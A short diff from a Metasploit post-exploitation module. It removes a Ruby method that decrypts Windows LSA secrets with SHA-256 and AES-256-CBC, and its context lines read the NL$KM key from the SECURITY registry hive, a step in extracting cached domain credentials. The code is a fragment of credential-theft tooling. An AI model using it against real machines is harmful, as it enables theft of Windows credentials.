@@ -83,31 +83,6 @@ class Metasploit3 < Msf::Post
 
   end
 
-  def decrypt_lsa(pol, encryptedkey)
-
-    sha256x = Digest::SHA256.new()
-    sha256x << encryptedkey
-    (1..1000).each do
-      sha256x << pol[28,32]
-    end
-
-    aes = OpenSSL::Cipher::Cipher.new("aes-256-cbc")
-    aes.key = sha256x.digest
-
-    print_status("digest #{sha256x.digest.unpack("H*")[0]}") if( datastore['DEBUG'] )
-
-    decryptedkey = ''
-
-    for i in (60...pol.length).step(16)
-      aes.decrypt
-      aes.padding = 0
-      xx = aes.update(pol[i...i+16])
-      decryptedkey += xx
-    end
-
-    return decryptedkey
-  end
-
   def capture_nlkm(lsakey)
     ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\Secrets\\NL$KM\\CurrVal", KEY_READ)
     nlkm = ok.query_value("").data
